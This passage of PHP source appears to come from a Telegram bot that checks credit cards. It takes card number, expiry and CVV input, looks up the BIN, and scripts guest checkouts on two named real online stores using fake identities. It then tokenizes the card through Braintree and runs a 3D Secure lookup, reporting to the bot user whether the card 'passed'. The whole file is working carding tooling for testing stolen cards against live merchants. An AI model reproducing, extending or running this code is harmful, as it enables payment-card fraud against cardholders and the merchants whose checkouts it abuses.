$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "MC";
}else if($cbin == "4"){
$cbin = "VI";
}else if($cbin == "3"){
$cbin = "amex";
}


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };

# Session ID
function SID(){
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}


# Formkey
function GetRandomWord($len = 20) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$Formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);



# Randomizing Details

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


# ----------------- [Bin Scrap ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-check-dr4g.herokuapp.com/api/'.$cc6.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Host: bin-check-dr4g.herokuapp.com',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$Lookup = curl_exec($ch);

$Vendor = getStr($Lookup, '"vendor":"','"');
$CardType = getStr($Lookup, '"type":"','"');
$CardLevel = getStr($Lookup, '"level":"','"');
$Bank = getStr($Lookup, '"bank":"','"');
$Country = getStr($Lookup, '"country":"','"');
$Emoji = getStr($Lookup, '"emoji":"','"');


curl_close($ch);
# ----------------- [ Bin Scrap End ] ---------------------#



if ((preg_match('/\s/', $lista)) || (!$cc) || (!$mes) || (strlen($cvv) < 3) || (!$cvv) || (!$ano) )  {
sendMessage($chatId, '<b>Invalid Card Format!</b> ❌%0A%0A<b>Format:</b> xxxxxxxxxxxxxxxx|xx|xxxx|xxx%0A%0A<b>Please try again.</b>');
return;
};



$executionStartTime = microtime(true);




# Add to cart

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.alexmonroe.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuYWxleG1vbnJvZS5jb20vYWxsb3RtZW50LWxvb3AtbmVja2xhY2Utd2l0aC1wbGF5ZnVsLW1vdXNl/product/26052/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /checkout/cart/add/uenc/aHR0cHM6Ly93d3cuYWxleG1vbnJvZS5jb20vYWxsb3RtZW50LWxvb3AtbmVja2xhY2Utd2l0aC1wbGF5ZnVsLW1vdXNl/product/26052/ HTTP/2',
    'Host: www.alexmonroe.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: en-US,en;q=0.5',
    'X-Requested-With: XMLHttpRequest',
    'Content-Type: multipart/form-data; boundary=---------------------------363083647331790082082139877650',
    'Origin: https://www.alexmonroe.com',
    'Connection: keep-alive',
    'Referer: https://www.alexmonroe.com/allotment-loop-necklace-with-playful-mouse',
    'Cookie: form_key='.$Formkey,
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '-----------------------------363083647331790082082139877650
Content-Disposition: form-data; name="product"

26052
-----------------------------363083647331790082082139877650
Content-Disposition: form-data; name="selected_configurable_option"


-----------------------------363083647331790082082139877650
Content-Disposition: form-data; name="related_product"


-----------------------------363083647331790082082139877650
Content-Disposition: form-data; name="item"

26052
-----------------------------363083647331790082082139877650
Content-Disposition: form-data; name="form_key"

'.$Formkey.'
-----------------------------363083647331790082082139877650
Content-Disposition: form-data; name="super_attribute[135]"

254
-----------------------------363083647331790082082139877650
Content-Disposition: form-data; name="qty"

1
-----------------------------363083647331790082082139877650--');

$Addtocart = curl_exec($ch);
curl_close($ch);


# Checkout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.alexmonroe.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'GET /checkout/ HTTP/2',
    'Host: www.alexmonroe.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Referer: https://www.alexmonroe.com/allotment-loop-necklace-with-playful-mouse',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$Checkout = curl_exec($ch);
$CartID = trim(strip_tags(getStr($Checkout, '"entity_id":"','"')));
$Authorization = json_decode($Decode = base64_decode($ClientToken = GetStr($Checkout, '"clientToken":"','"')), true)['authorizationFingerprint'];
curl_close($ch);


# Shipping Information

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.alexmonroe.com/rest/default/V1/guest-carts/'.$CartID.'/shipping-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /rest/default/V1/guest-carts/'.$CartID.'/shipping-information HTTP/2',
    'Host: www.alexmonroe.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/json',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://www.alexmonroe.com',
    'Connection: keep-alive',
    'Referer: https://www.alexmonroe.com/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"13","regionCode":"CO","region":"Colorado","street":["4813 Olive St"],"company":"","telephone":"4193939123","postcode":"80022-4701","city":"Commerce City","firstname":"Som","lastname":"Nus","extension_attributes":{}},"billing_address":{"countryId":"US","regionId":"13","regionCode":"CO","region":"Colorado","street":["4813 Olive St"],"company":"","telephone":"4193939123","postcode":"80022-4701","city":"Commerce City","firstname":"Som","lastname":"Nus","extension_attributes":{},"saveInAddressBook":null},"shipping_method_code":"bestway","shipping_carrier_code":"tablerate","extension_attributes":{}}}');

$ShippingInformation = curl_exec($ch);
curl_close($ch);


# Graphql

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /graphql HTTP/1.1',
    'Host: payments.braintree-api.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/json',
    'Authorization: Bearer '.$Authorization.'',
    'Braintree-Version: 2018-05-10',
    'Origin: https://assets.braintreegateway.com',
    'Connection: keep-alive',
    'Referer: https://assets.braintreegateway.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.SID().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$Graphql = curl_exec($ch);
$Token = trim(strip_tags(getStr($Graphql, '"token":"','"')));
curl_close($ch);



# Lookup

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/dbqb3zrpz2xnp7m9/client_api/v1/payment_methods/'.$Token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /merchants/dbqb3zrpz2xnp7m9/client_api/v1/payment_methods/'.$Token.'/three_d_secure/lookup HTTP/2',
    'Host: api.braintreegateway.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/json',
    'Origin: https://www.alexmonroe.com',
    'Connection: keep-alive',
    'Referer: https://www.alexmonroe.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"135.00","additionalInfo":{"billingLine1":"4813 Olive St","billingCity":"Commerce City","billingState":"CO","billingPostalCode":"80022-4701","billingCountryCode":"US","billingPhoneNumber":"4193939123","billingGivenName":"Som","billingSurname":"Nus"},"dfReferenceId":"0_2c3758a9-541d-4c0e-bf85-8acd2160a18b","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.79.1","cardinalDeviceDataCollectionTimeElapsed":383},"authorizationFingerprint":"'.$Authorization.'","braintreeLibraryVersion":"braintree/web/3.79.1","_meta":{"merchantAppId":"www.alexmonroe.com","platform":"web","sdkVersion":"3.79.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"9fe4b775-e51b-4799-b508-57723649bf45"}}');

$Lookup = curl_exec($ch);
$Nonce = trim(strip_tags(getStr($Lookup, '"nonce":"','"')));
$Status = trim(strip_tags(getStr($Lookup, '"status":"','"')));
$Enrolled = trim(strip_tags(getStr($Lookup, '"enrolled":"','"')));

$executionEndTime = microtime(true);
$seconds = $executionEndTime - $executionStartTime;
$TimeTaken = substr($seconds,0,4);

$Http = curl_getinfo($ch)['http_code'];
$TotalTime = curl_getinfo($ch)['total_time'];
$Time = substr($TotalTime, 0,4);
curl_close($ch);






# Responses >

if(strpos($Lookup, '"lookup_not_enrolled')) {
sendMessage($chatId, '<b>VBV/MSC PASSED!</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> 3D Lookup%0A<b><u>Response:</u></b> '.$Status.' - '.$Enrolled.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}
else {
sendMessage($chatId, '<b>VBV/MSC ENROLLED!</b> ❌%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> 3D Lookup%0A<b><u>Response:</u></b> '.$Status.' - '.$Enrolled.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}

curl_close($ch);
unlink('cookie.txt');

}




#--------------------- [ Cybersource ]-------------------#

if ((strpos($message, "!cyb") === 0)||(strpos($message, "/cyb") === 0)){
$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$cvvlength = strlen($cvv);
$yearlength = strlen($ano);
$banner = substr($message, 5,6);

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };


error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "MC";
}else if($cbin == "4"){
$cbin = "VI";
}else if($cbin == "3"){
$cbin = "amex";
}

# Session ID
function SID(){
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

# Device Session ID
function DeviceID($length)
{
    $characters       = '0123456789abcdefghijklmnopqrs';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$DeviceSessionID = DeviceID(32);



# Correlation ID
function CorrelationID($length)
{
    $characters       = '0123456789abcdefghijklmnopqrs';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$CorrelationID = CorrelationID(32);


# Randomizing Details

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];




# ----------------- [Bin Scrap ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-check-dr4g.herokuapp.com/api/'.$cc6.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Host: bin-check-dr4g.herokuapp.com',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$Lookup = curl_exec($ch);

$Vendor = getStr($Lookup, '"vendor":"','"');
$CardType = getStr($Lookup, '"type":"','"');
$CardLevel = getStr($Lookup, '"level":"','"');
$Bank = getStr($Lookup, '"bank":"','"');
$Country = getStr($Lookup, '"country":"','"');
$Emoji = getStr($Lookup, '"emoji":"','"');


curl_close($ch);
# ----------------- [ Bin Scrap End ] ---------------------#



if ((preg_match('/\s/', $lista)) || (!$cc) || (!$mes) || (strlen($cvv) < 3) || (!$cvv) || (!$ano) )  {
sendMessage($chatId, '<b>Invalid Card Format!</b> ❌%0A%0A<b>Format:</b> xxxxxxxxxxxxxxxx|xx|xxxx|xxx%0A%0A<b>Please try again.</b>');
return;
};



$executionStartTime = microtime(true);




# Formkey

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.surveillance-video.com/accessory-2400-223.html');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'GET /accessory-2400-223.html HTTP/2',
    'Host: www.surveillance-video.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: none',
    'Sec-Fetch-User: ?1',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');

$GetFormkey = curl_exec($ch);
$Formkey = trim(strip_tags(GetStr($GetFormkey, '<input name="form_key" type="hidden" value="','" />')));
curl_close($ch);



# Add to Cart

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.surveillance-video.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuc3VydmVpbGxhbmNlLXZpZGVvLmNvbS9hY2Nlc3NvcnktMjQwMC0yMjMuaHRtbA%2C%2C/product/109069/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /checkout/cart/add/uenc/aHR0cHM6Ly93d3cuc3VydmVpbGxhbmNlLXZpZGVvLmNvbS9hY2Nlc3NvcnktMjQwMC0yMjMuaHRtbA%2C%2C/product/109069/ HTTP/2',
    'Host: www.surveillance-video.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: en-US,en;q=0.5',
    'X-Requested-With: XMLHttpRequest',
    'Content-Type: multipart/form-data; boundary=---------------------------9069209025250719682613504517',
    'Origin: https://www.surveillance-video.com',
    'Connection: keep-alive',
    'Referer: https://www.surveillance-video.com/accessory-2400-223.html',
    'Cookie: form_key='.$Formkey.'',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '-----------------------------9069209025250719682613504517
Content-Disposition: form-data; name="product"

109069
-----------------------------9069209025250719682613504517
Content-Disposition: form-data; name="selected_configurable_option"


-----------------------------9069209025250719682613504517
Content-Disposition: form-data; name="related_product"


-----------------------------9069209025250719682613504517
Content-Disposition: form-data; name="item"

109069
-----------------------------9069209025250719682613504517
Content-Disposition: form-data; name="form_key"

'.$Formkey.'
-----------------------------9069209025250719682613504517
Content-Disposition: form-data; name="qty"

1
-----------------------------9069209025250719682613504517--');

$Addtocart = curl_exec($ch);
curl_close($ch);



# Checkout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.surveillance-video.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'GET /checkout/ HTTP/2',
    'Host: www.surveillance-video.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Referer: https://www.surveillance-video.com/accessory-2400-223.html',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');

$Checkout = curl_exec($ch);
$CartID = trim(strip_tags(GetStr($Checkout, '"entity_id":"','"')));
curl_close($ch);


# Shipping Information

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.surveillance-video.com/rest/default/V1/guest-carts/'.$CartID.'/shipping-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /rest/default/V1/guest-carts/'.$CartID.'/shipping-information HTTP/2',
    'Host: www.surveillance-video.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/json',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://www.surveillance-video.com',
    'Connection: keep-alive',
    'Referer: https://www.surveillance-video.com/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"13","regionCode":"CO","region":"Colorado","street":["4813 Olive St"],"company":"","telephone":"4193939123","postcode":"80022","city":"Commerce City","firstname":"Som","lastname":"Knows","customAttributes":[{"attribute_code":"custom_field_1","value":""}]},"billing_address":{"countryId":"US","regionId":"13","regionCode":"CO","region":"Colorado","street":["4813 Olive St"],"company":"","telephone":"4193939123","postcode":"80022","city":"Commerce City","firstname":"Som","lastname":"Knows","customAttributes":[{"attribute_code":"custom_field_1","value":""}],"saveInAddressBook":null},"shipping_method_code":"flatrate","shipping_carrier_code":"flatrate","extension_attributes":{}}}');

$ShippingInformation = curl_exec($ch);
curl_close($ch);


# Set Payment Information

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.surveillance-video.com/rest/default/V1/guest-carts/'.$CartID.'/set-payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /rest/default/V1/guest-carts/'.$CartID.'/set-payment-information HTTP/2',
    'Host: www.surveillance-video.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/json',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://www.surveillance-video.com',
    'Connection: keep-alive',
    'Referer: https://www.surveillance-video.com/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
